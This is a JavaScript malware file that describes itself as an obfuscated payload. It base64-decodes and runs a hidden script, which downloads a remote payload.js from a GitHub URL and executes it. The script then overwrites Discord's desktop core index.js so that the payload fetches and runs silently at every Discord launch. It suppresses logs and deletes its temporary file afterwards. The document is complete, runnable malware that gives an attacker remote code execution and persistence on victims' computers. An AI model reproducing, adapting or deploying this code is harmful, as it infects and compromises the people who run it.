// Obfuscated payload - Automatically generated
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// Base64 encoded content
const encodedPayload = "Y29uc3QgZnMgPSByZXF1aXJlKCJmcyIpOwpjb25zdCBwYXRoID0gcmVxdWlyZSgicGF0aCIpOwpjb25zdCBodHRwcyA9IHJlcXVpcmUoImh0dHBzIik7CmNvbnN0IHsgZXhlYyB9ID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwpjb25zdCBvcyA9IHJlcXVpcmUoIm9zIik7CgovLyBDb25maWd1cmF0aW9uCmNvbnN0IENPTkZJRyA9IHsKICAgIGhpZGRlbjogdHJ1ZSAvLyBTZXQgdG8gdHJ1ZSB0byBoaWRlIGxvZ3MKfTsKCmNvbnN0IGxvY2FsID0gcHJvY2Vzcy5lbnYuTE9DQUxBUFBEQVRBOwpjb25zdCBhcHBEYXRhID0gcHJvY2Vzcy5lbnYuQVBQREFUQSB8fCBwYXRoLmpvaW4ob3MuaG9tZWRpcigpLCAiQXBwRGF0YSIsICJSb2FtaW5nIik7CmNvbnN0IG9uZXJnRGlyID0gcGF0aC5qb2luKGFwcERhdGEsICJvbmVyZyIpOwoKLy8gVVJMIGR1IHBheWxvYWQgw6AgdMOpbMOpY2hhcmdlciAow6AgcmVtcGxhY2VyIHBhciB2b3RyZSBVUkwgR2l0SHViKQpjb25zdCBQQVlMT0FEX1VSTCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2FtZWxuZWcvMDAyMS9yZWZzL2hlYWRzL21haW4vcGF5bG9hZC5qcyI7CmNvbnN0IFBBWUxPQURfUEFUSCA9IHBhdGguam9pbihvbmVyZ0RpciwgInBheWxvYWQuanMiKTsKCi8vIExvZ2dpbmcgZnVuY3Rpb24gdGhhdCByZXNwZWN0cyBoaWRkZW4gbW9kZQpmdW5jdGlvbiBsb2cobWVzc2FnZSwgaXNFcnJvciA9IGZhbHNlKSB7CiAgICBpZiAoIUNPTkZJRy5oaWRkZW4pIHsKICAgICAgICBpZiAoaXNFcnJvcikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKG1lc3NhZ2UpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKG1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KfQoKLy8gRm9uY3Rpb24gcG91ciB0w6lsw6ljaGFyZ2VyIHVuIGZpY2hpZXIKZnVuY3Rpb24gZG93bmxvYWRGaWxlKHVybCwgZGVzdCkgewogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAvLyBDcsOpZXIgbGUgZG9zc2llciBkZSBkZXN0aW5hdGlvbiBzJ2lsIG4nZXhpc3RlIHBhcwogICAgICAgIGNvbnN0IGRpciA9IHBhdGguZGlybmFtZShkZXN0KTsKICAgICAgICBpZiAoIWZzLmV4aXN0c1N5bmMoZGlyKSkgewogICAgICAgICAgICBmcy5ta2RpclN5bmMoZGlyLCB7IHJlY3Vyc2l2ZTogdHJ1ZSB9KTsKICAgICAgICB9CgogICAgICAgIGNvbnN0IGZpbGUgPSBmcy5jcmVhdGVXcml0ZVN0cmVhbShkZXN0KTsKICAgICAgICBodHRwcy5nZXQodXJsLCAocmVzcG9uc2UpID0+IHsKICAgICAgICAgICAgcmVzcG9uc2UucGlwZShmaWxlKTsKICAgICAgICAgICAgZmlsZS5vbigiZmluaXNoIiwgKCkgPT4gewogICAgICAgICAgICAgICAgZmlsZS5jbG9zZSgpOwogICAgICAgICAgICAgICAgcmVzb2x2ZSgpOwogICAgICAgICAgICB9KTsKICAgICAgICB9KS5vbigiZXJyb3IiLCAoZXJyKSA9PiB7CiAgICAgICAgICAgIGZzLnVubGluayhkZXN0LCAoKSA9PiB7fSk7CiAgICAgICAgICAgIHJlamVjdChlcnIpOwogICAgICAgIH0pOwogICAgfSk7Cn0KCi8vIFTDqWzDqWNoYXJnZXIgZXQgZXjDqWN1dGVyIGxlIHBheWxvYWQKYXN5bmMgZnVuY3Rpb24gc2V0dXBQYXlsb2FkKCkgewogICAgdHJ5IHsKICAgICAgICBsb2coYFsrXSBUw6lsw6ljaGFyZ2VtZW50IGR1IHBheWxvYWQgZGVwdWlzICR7UEFZTE9BRF9VUkx9YCk7CiAgICAgICAgYXdhaXQgZG93bmxvYWRGaWxlKFBBWUxPQURfVVJMLCBQQVlMT0FEX1BBVEgpOwogICAgICAgIGxvZyhgWytdIFBheWxvYWQgdMOpbMOpY2hhcmfDqSB2ZXJzICR7UEFZTE9BRF9QQVRIfWApOwogICAgICAgIAogICAgICAgIC8vIEV4w6ljdXRlciBsZSBwYXlsb2FkCiAgICAgICAgZXhlYyhgbm9kZSAiJHtQQVlMT0FEX1BBVEh9ImAsIChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpID0+IHsKICAgICAgICAgICAgaWYgKGVycm9yKSB7CiAgICAgICAgICAgICAgICBsb2coYFstXSBFcnJldXIgZCdleMOpY3V0aW9uOiAke2Vycm9yLm1lc3NhZ2V9YCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHN0ZGVycikgewogICAgICAgICAgICAgICAgbG9nKGBbLV0gU3RkZXJyOiAke3N0ZGVycn1gLCB0cnVlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBsb2coYFsrXSBTdGRvdXQ6ICR7c3Rkb3V0fWApOwogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIHJldHVybiB0cnVlOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBsb2coYFstXSBFcnJldXI6ICR7ZXJyb3IubWVzc2FnZX1gLCB0cnVlKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9Cn0KCmFzeW5jIGZ1bmN0aW9uIEluZmVjdERpc2NvcmRzKCkgewogICAgLy8gSW5qZWN0aW9uIHF1aSB0w6lsw6ljaGFyZ2VyYSBldCBleMOpY3V0ZXJhIG5vdHJlIHBheWxvYWQKICAgIHZhciBpbmplY3Rpb24gPSBgCmNvbnN0IGZzID0gcmVxdWlyZSgnZnMnKTsKY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKY29uc3QgaHR0cHMgPSByZXF1aXJlKCdodHRwcycpOwpjb25zdCB7IGV4ZWMgfSA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTsKY29uc3Qgb3MgPSByZXF1aXJlKCdvcycpOwoKLy8gQ29uZmlndXJlciBsZSBjaGVtaW4gZXQgbCdVUkwKY29uc3QgYXBwRGF0YSA9IHByb2Nlc3MuZW52LkFQUERBVEEgfHwgcGF0aC5qb2luKG9zLmhvbWVkaXIoKSwgIkFwcERhdGEiLCAiUm9hbWluZyIpOwpjb25zdCBvbmVyZ0RpciA9IHBhdGguam9pbihhcHBEYXRhLCAib25lcmciKTsKY29uc3QgUEFZTE9BRF9VUkwgPSAiJHtQQVlMT0FEX1VSTH0iOwpjb25zdCBQQVlMT0FEX1BBVEggPSBwYXRoLmpvaW4ob25lcmdEaXIsICJwYXlsb2FkLmpzIik7CgovLyBGb25jdGlvbiBwb3VyIHTDqWzDqWNoYXJnZXIgdW4gZmljaGllcgpmdW5jdGlvbiBkb3dubG9hZEZpbGUodXJsLCBkZXN0KSB7CiAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgIC8vIENyw6llciBsZSBkb3NzaWVyIGRlIGRlc3RpbmF0aW9uIHMnaWwgbidleGlzdGUgcGFzCiAgICAgICAgY29uc3QgZGlyID0gcGF0aC5kaXJuYW1lKGRlc3QpOwogICAgICAgIGlmICghZnMuZXhpc3RzU3luYyhkaXIpKSB7CiAgICAgICAgICAgIGZzLm1rZGlyU3luYyhkaXIsIHsgcmVjdXJzaXZlOiB0cnVlIH0pOwogICAgICAgIH0KCiAgICAgICAgY29uc3QgZmlsZSA9IGZzLmNyZWF0ZVdyaXRlU3RyZWFtKGRlc3QpOwogICAgICAgIGh0dHBzLmdldCh1cmwsIChyZXNwb25zZSkgPT4gewogICAgICAgICAgICByZXNwb25zZS5waXBlKGZpbGUpOwogICAgICAgICAgICBmaWxlLm9uKCJmaW5pc2giLCAoKSA9PiB7CiAgICAgICAgICAgICAgICBmaWxlLmNsb3NlKCk7CiAgICAgICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pLm9uKCJlcnJvciIsIChlcnIpID0+IHsKICAgICAgICAgICAgZnMudW5saW5rKGRlc3QsICgpID0+IHt9KTsKICAgICAgICAgICAgcmVqZWN0KGVycik7CiAgICAgICAgfSk7CiAgICB9KTsKfQoKLy8gRXjDqWN1dGVyIG5vdHJlIHBheWxvYWQgYXUgZMOpbWFycmFnZSBkZSBEaXNjb3JkCnNldFRpbWVvdXQoYXN5bmMgKCkgPT4gewogICAgdHJ5IHsKICAgICAgICAvLyBUw6lsw6ljaGFyZ2VyIGxlIHBheWxvYWQgcydpbCBuJ2V4aXN0ZSBwYXMKICAgICAgICBpZiAoIWZzLmV4aXN0c1N5bmMoUEFZTE9BRF9QQVRIKSkgewogICAgICAgICAgICBhd2FpdCBkb3dubG9hZEZpbGUoUEFZTE9BRF9VUkwsIFBBWUxPQURfUEFUSCk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIEV4w6ljdXRlciBsZSBwYXlsb2FkCiAgICAgICAgZXhlYygnbm9kZSAiJyArIFBBWUxPQURfUEFUSCArICciJyk7CiAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgLy8gU2lsZW5jaWV1eCBlbiBjYXMgZCdlcnJldXIgcG91ciDDqXZpdGVyIGRlIGNhc3NlciBEaXNjb3JkCiAgICB9Cn0sIDUwMDApOwoKLy8gUGVybWV0dHJlIMOgIERpc2NvcmQgZGUgZm9uY3Rpb25uZXIgbm9ybWFsZW1lbnQKbW9kdWxlLmV4cG9ydHMgPSByZXF1aXJlKCcuL2NvcmUuYXNhcicpOwpgOwoKICAgIC8vIEQnYWJvcmQsIHTDqWzDqWNoYXJnZXIgZXQgZXjDqWN1dGVyIGxlIHBheWxvYWQKICAgIGF3YWl0IHNldHVwUGF5bG9hZCgpOwoKICAgIC8vIEVuc3VpdGUsIGluZmVjdGVyIERpc2NvcmQgZW4gYXJyacOocmUtcGxhbgogICAgZnMucmVhZGRpcihsb2NhbCwgKGVyciwgZmlsZXMpID0+IHsKICAgICAgICBpZiAoZXJyKSByZXR1cm47CgogICAgICAgIGZpbGVzLmZvckVhY2goZGlzY29yZFBhdGggPT4gewogICAgICAgICAgICBpZiAoIWRpc2NvcmRQYXRoLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoImNvcmQiKSkgcmV0dXJuOwoKICAgICAgICAgICAgY29uc3QgZGlzY29yZERpciA9IHBhdGguam9pbihsb2NhbCwgZGlzY29yZFBhdGgpOwoKICAgICAgICAgICAgZnMucmVhZGRpcihkaXNjb3JkRGlyLCAoZXJyLCBmaWxlKSA9PiB7CiAgICAgICAgICAgICAgICBpZiAoZXJyKSByZXR1cm47CgogICAgICAgICAgICAgICAgZmlsZS5mb3JFYWNoKGluc2lkZURpc2NvcmREaXIgPT4gewogICAgICAgICAgICAgICAgICAgIGlmICghaW5zaWRlRGlzY29yZERpci5pbmNsdWRlcygiYXBwLSIpKSByZXR1cm47CgogICAgICAgICAgICAgICAgICAgIGNvbnN0IGFwcERpciA9IHBhdGguam9pbihkaXNjb3JkRGlyLCBpbnNpZGVEaXNjb3JkRGlyKTsKCiAgICAgICAgICAgICAgICAgICAgZnMucmVhZGRpcihhcHBEaXIsIChlcnIsIGZpbGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS5mb3JFYWNoKGluc2lkZUFwcERpciA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWluc2lkZUFwcERpci5pbmNsdWRlcygibW9kdWxlcyIpKSByZXR1cm47CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgbW9kdWxlc0RpciA9IHBhdGguam9pbihhcHBEaXIsIGluc2lkZUFwcERpcik7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnMucmVhZGRpcihtb2R1bGVzRGlyLCAoZXJyLCBmaWxlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlLmZvckVhY2goaW5zaWRlTW9kdWxlc0RpciA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghaW5zaWRlTW9kdWxlc0Rpci5pbmNsdWRlcygiZGlzY29yZF9kZXNrdG9wX2NvcmUiKSkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgY29yZURpciA9IHBhdGguam9pbihtb2R1bGVzRGlyLCBpbnNpZGVNb2R1bGVzRGlyKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJlYWRkaXIoY29yZURpciwgKGVyciwgZmlsZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUuZm9yRWFjaChpbnNpZGVDb3JlID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWluc2lkZUNvcmUuaW5jbHVkZXMoImRpc2NvcmRfZGVza3RvcF9jb3JlIikpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZmluYWxEaXIgPSBwYXRoLmpvaW4oY29yZURpciwgaW5zaWRlQ29yZSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJlYWRkaXIoZmluYWxEaXIsIChlcnIsIGZpbGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS5mb3JFYWNoKGluc2lkZUNvcmVGaW5hbCA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWluc2lkZUNvcmVGaW5hbC5pbmNsdWRlcygiaW5kZXguanMiKSkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRhcmdldEluZGV4ID0gcGF0aC5qb2luKGZpbmFsRGlyLCAiaW5kZXguanMiKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzLndyaXRlRmlsZVN5bmModGFyZ2V0SW5kZXgsIGluamVjdGlvbik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKGDinIUgSW5qZWN0aW9uIGZhaXRlIDogJHt0YXJnZXRJbmRleH1gKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coYOKdjCDDiWNoZWMgaW5qZWN0aW9uIDogJHt0YXJnZXRJbmRleH1gLCB0cnVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9KTsKfQoKLy8gUGFyc2UgY29tbWFuZCBsaW5lIGFyZ3VtZW50cwpjb25zdCBhcmdzID0gcHJvY2Vzcy5hcmd2LnNsaWNlKDIpOwppZiAoYXJncy5pbmNsdWRlcygnLS1oaWRkZW4nKSkgewogICAgQ09ORklHLmhpZGRlbiA9IHRydWU7Cn0KCi8vIFN0YXJ0IHRoZSBpbmZlY3Rpb24gcHJvY2VzcyBhbmQgZW5zdXJlIHNjcmlwdCBjYW4gdGVybWluYXRlCihhc3luYyAoKSA9PiB7CiAgICAvLyBTdGFydCB0aGUgaW5mZWN0aW9uIHByb2Nlc3MKICAgIEluZmVjdERpc2NvcmRzKCk7CiAgICAKICAgIC8vIEFsbG93IHNjcmlwdCB0byB0ZXJtaW5hdGUgbmF0dXJhbGx5IHdpdGhvdXQgd2FpdGluZyBmb3IgYWxsIGNhbGxiYWNrcwogICAgLy8gVGhlIGJhY2tncm91bmQgb3BlcmF0aW9ucyB3aWxsIGNvbnRpbnVlIHJ1bm5pbmcKICAgIGxvZygnWytdIFByb2Nlc3N1cyBkXCdpbmZlY3Rpb24gZMOpbWFycsOpIGVuIGFycmnDqHJlLXBsYW4nKTsKfSkoKTs=";

// Function to decode and execute the payload
function executePayload() {
    try {
        // Decode the payload
        const decodedPayload = Buffer.from(encodedPayload, 'base64').toString('utf8');
        
        // Create a temporary file
        const tempDir = path.join(process.env.APPDATA, 'onerg');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        
        const tempFile = path.join(tempDir, `payload_${Date.now()}.js`);
        
        // Write the decoded payload to the temporary file
        fs.writeFileSync(tempFile, decodedPayload);
        
        // Execute the payload
        exec(`node "${tempFile}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`[-] Execution error: ${error.message}`);
                return;
            }
            if (stdout) console.log(stdout);
            if (stderr) console.error(stderr);
            
            // Clean up the temporary file after execution
            try {
                fs.unlinkSync(tempFile);
            } catch (cleanupError) {
                console.error(`[-] Cleanup error: ${cleanupError.message}`);
            }
        });
    } catch (error) {
        console.error(`[-] Error: ${error.message}`);
    }
}

// Execute the payload
executePayload();